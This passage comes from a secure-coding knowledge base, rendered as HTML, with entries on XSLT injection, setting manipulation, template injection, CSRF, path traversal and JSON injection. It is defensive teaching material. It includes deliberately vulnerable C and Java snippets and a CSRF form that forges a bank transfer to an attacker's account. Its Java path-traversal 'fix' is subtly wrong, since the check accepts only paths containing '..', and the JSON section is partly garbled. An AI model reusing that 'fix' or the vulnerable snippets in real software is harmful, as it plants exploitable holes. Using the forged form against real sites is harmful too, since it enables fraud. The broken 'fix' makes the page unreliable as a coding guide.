        <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/400.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-789.html">CWE-789</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1094">XSLT Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>XSLT (Extensible Stylesheet Language Transformations) is a language for transforming XML documents into other XML documents, or other formats such as HTML for web pages, plain text or XSL Formatting Objects, which may subsequently be converted to other formats, such as PDF, PostScript and PNG. XSLT 1.0 is widely supported in modern web browsers.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>XSLT injection may cause information exposure, arbitrary code execution, malicious file reading/writing and injection problems.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/XSLT <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1078">Setting Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>One or more system settings or configuration elements can be externally controlled by a user.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn.</p>
</li>
<li>
<p>In general, do not allow user-provided or otherwise untrusted data to control sensitive values.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following Java code snippet reads a string from an HttpServletRequest and sets it as the active catalog for a database Connection.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">conn</span><span class="o">.</span><span class="na">setCatalog</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"catalog"</span><span class="o">));</span>
</pre></div>
</td></tr></table>
<p>In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/15.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1098">Server-Side Template Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>To present dynamic data on a web page or email, template engines are widely used by web applications.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Without proper validation of user input in templates, it will enable Server-Side Template Injection, a critical vulnerability that is extremely easy to mistake for Cross-Site Scripting XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution, turning every vulnerable application into a potential pivot point.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Use a trivial template engine.</p>
</li>
<li>
<p>Sandbox it inside a relatively safe Docker container.</p>
</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-blackhat">
<p>https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf <a class="footnote-backref" href="#fnref-blackhat" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0093">Cross-Site Request Forgery(CSRF)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
</ul>
</li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ol>
<li>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP CSRFGuard.    </li>
<li>Ensure that the application is free of cross-site scripting issues(CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script. </li>
<li>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</li>
<li>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation. </li>
<li>Do not use the GET method for any request that triggers a state change. </li>
<li>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons. </li>
</ol>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>Assume that your bank's website provides a form that allows transferring money from the currently logged in user to another bank account. For example, the HTTP request might look like:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/transfer</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">bank.example.com</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=randomid; Domain=bank.example.com; Secure; HttpOnly</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>

amount=100.00&amp;routingNumber=1234&amp;account=9876
</pre></div>
</td></tr></table>
<p>Now pretend you authenticate to your bank's website and then, without logging out, visit an evil website. The evil website contains an HTML page with the following form:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://bank.example.com/transfer"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"amount"</span>
    <span class="na">value=</span><span class="s">"100.00"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"routingNumber"</span>
    <span class="na">value=</span><span class="s">"evilsRoutingNumber"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"account"</span>
    <span class="na">value=</span><span class="s">"evilsAccountNumber"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span>
    <span class="na">value=</span><span class="s">"Win Money!"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</pre></div>
</td></tr></table>
<p>You like to win money, so you click on the submit button. In the process, you have unintentionally transferred $100 to a malicious user. This happens because, while the evil website cannot see your cookies, the cookies associated with your bank are still sent along with the request.</p>
<p>How to fix: See "Potential Mitigations"
References
================</p>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE352">
<p>https://cwe.mitre.org/data/definitions/352.html <a class="footnote-backref" href="#fnref-CWE352" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF).html <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-352.html">CWE-352</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0086">Path Traversal Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#fixed-example-1">Fixed Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
<li><a href="#fixed-code-example-2">Fixed Code Example 2</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Many file operations are intended to take place within a restricted directory. By using special elements such as ".." and "/" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the "../" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as "/usr/local/bin", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the software may add ".txt" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</p>
<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</p>
<p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</p>
<p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</p>
<p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">path_traversal</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">file_path</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span> <span class="c1">// @@bad@@</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>The vulnerable code example does not validate the file_path of the external input and may trigger a path traversal vulnerability.</p>
<h3 id="fixed-example-1">Fixed Example 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">bool</span> <span class="nf">verify_file_path</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file_path</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">path_traversal</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">file_path</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">verify_file_path</span><span class="p">(</span><span class="n">file_path</span><span class="p">)){</span> <span class="c1">// @@good@@</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>In the vulnerability code repair example, by calling the verify_file_path () function, the path is effectively verified, and the path traversal vulnerability can be prevented.</p>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">testbad</span><span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">InputStream</span> <span class="n">is1</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="n">InputStream</span> <span class="n">is2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">128</span><span class="o">];</span>
            <span class="n">is1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"filepath"</span><span class="o">);</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">file_path</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">128</span><span class="o">);</span>
      <span class="n">is2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">));</span>  <span class="c1">// @@bad@@</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">E</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="n">is2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>The vulnerable code example does not validate the file_path of the external input and may trigger a path traversal vulnerability.</p>
<h3 id="fixed-code-example-2">Fixed Code Example 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">testgood</span><span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">verify_file_path</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span><span class="o">){</span>
    <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">".."</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">InputStream</span> <span class="n">is1</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="n">InputStream</span> <span class="n">is2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">128</span><span class="o">];</span>
            <span class="n">is1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"filepath"</span><span class="o">);</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">file_path</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">128</span><span class="o">);</span>
      <span class="k">if</span><span class="o">(!</span><span class="n">verify_file_path</span><span class="o">(</span><span class="n">file_path</span><span class="o">)){</span>  <span class="c1">// @@good@@</span>
        <span class="k">return</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="n">is2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">E</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="n">is2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>In the vulnerability code repair example, by calling the verify_file_path () function, the path is effectively verified, and the path traversal vulnerability can be prevented.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE23">
<p>http://cwe.mitre.org/data/definitions/23.html <a class="footnote-backref" href="#fnref-CWE23" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-CERT-FIO16-J">
<p>https://wiki.sei.cmu.edu/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them <a class="footnote-backref" href="#fnref-CERT-FIO16-J" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
<li id="fn-CERT-FIO02-C">
<p>https://wiki.sei.cmu.edu/confluence/display/c/FIO02-C.+Canonicalize+path+names+originating+from+tainted+sources <a class="footnote-backref" href="#fnref-CERT-FIO02-C" title="Jump back to footnote 3 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">Java</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1105">JSON Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>JSON is a syntax for serializing objects, arrays, numbers, strings, booleans, and null, typically used by applications to store date or send messages.
For example, the following example is the simplest Key→Value example of JSON (name/value pairs, key-value pairs):</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">{</span> <span class="s">"UserName"</span><span class="o">:</span> <span class="s">"xxser"</span><span class="p">,</span> <span class="s">"PassWord"</span><span class="o">:</span> <span class="s">"nike"</span><span class="p">,</span> <span class="s">"email"</span><span class="o">:</span> <span class="s">"root@secbug.org"</span> <span class="p">}</span>
</pre></div>
</td></tr></table>
<p>After understanding the basic JSON knowledge, let's look at the injection in JSON.
In the basics of JSON, we learned that JSON distinguishes the meaning of each character based on quotation marks ("), colons (:), commas (,), and curly braces ({}). If a malicious user injects maliciously into JSON Character, then JSON will parse failure. For example, the value of PassWord is:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Admin</span><span class="s">"888</span>
</pre></div>
</td></tr></table>
<p>Then the assembled JSON data bits are as follows:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s">"PassWord"</span><span class="o">:</span> <span class="s">"admin"</span><span class="mi">888</span><span class="s">"</span>
</pre></div>
</td></tr></table>
<p>The quotation marks in PassWord will destroy the entire JSON structure, causing JSON parsing to fail.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>When an application uses untrusted user inputs to construct a JSON file, attackers may inject arbitrary elements that cause a parsing error or even change the structure of the JSON file.  JSON injection can also lead to code execution or cross-site scripting.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>1 Escape its key characters. Such as:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s">"admin"</span><span class="mi">888</span><span class="s">"</span>
</pre></div>
</td></tr></table>
<p>Convert to
<code>c
"admin\"888"</code>c
This way the value of JSON can be parsed. If "\" appears in the string, you also need to escape it to "\".
2 Use some third-party components. Taking Java as an example, using JSON-lib.jar to form JSON data can effectively avoid JSON injection.</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
